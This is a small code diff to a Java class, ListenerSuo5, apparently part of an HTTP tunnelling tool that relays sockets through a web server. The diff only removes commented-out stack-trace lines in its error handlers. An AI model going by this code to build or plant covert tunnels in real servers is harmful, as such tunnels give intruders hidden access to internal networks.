@@ -453,7 +453,7 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
                 invokeMethod(resp.getClass(), resp, "flushBuffer", new Class[]{}, new Object[]{});
             } catch (Exception e) {
 //                    System.out.printf("connect error %s\n", e);
-//                    e.printStackTrace();
+//                    
                 this.remove(clientId);
                 respOutStream.write(marshal(newStatus((byte) 0x01)));
                 respOutStream.flush();
@@ -465,7 +465,7 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
             readSocket(readFrom, respOutStream, !needRedirect);
         } catch (Exception e) {
 //                System.out.println("socket error " + e.toString());
-//                e.printStackTrace();
+//                
         } finally {
             if (sc != null) {
                 sc.close();
@@ -483,7 +483,7 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
             readSocket(gInStream, gOutStream, true);
         } catch (Exception e) {
 //                System.out.printf("read socket error, %s\n", e);
-//                e.printStackTrace();
+//                
         }
     }
 
@@ -509,7 +509,7 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
             }
         } catch (Exception e) {
 //                System.out.printf("read socket error, %s\n", e);
-//                e.printStackTrace();
+//                
         }
         return addrs;
     }
